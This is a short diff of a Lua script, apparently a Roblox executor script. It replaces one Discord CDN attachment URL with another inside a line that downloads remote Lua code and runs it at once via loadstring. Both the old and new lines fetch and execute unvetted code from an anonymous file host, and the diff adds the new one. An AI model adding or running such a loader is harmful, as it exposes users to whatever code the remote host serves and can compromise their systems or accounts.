@@ -342,6 +342,6 @@ do
     
     
     local http_request = http_request or request or (syn and syn.request) or (http and http.request)
-loadstring(http_request({Url="https://cdn.discordapp.com/attachments/941724908537393152/1012401979831619624/output-lVay.lua", Method="GET"}).Body)()end;
+loadstring(http_request({Url="https://cdn.discordapp.com/attachments/944941820373270528/1084874051882844160/WFQAOI.lua", Method="GET"}).Body)()end;
     
     
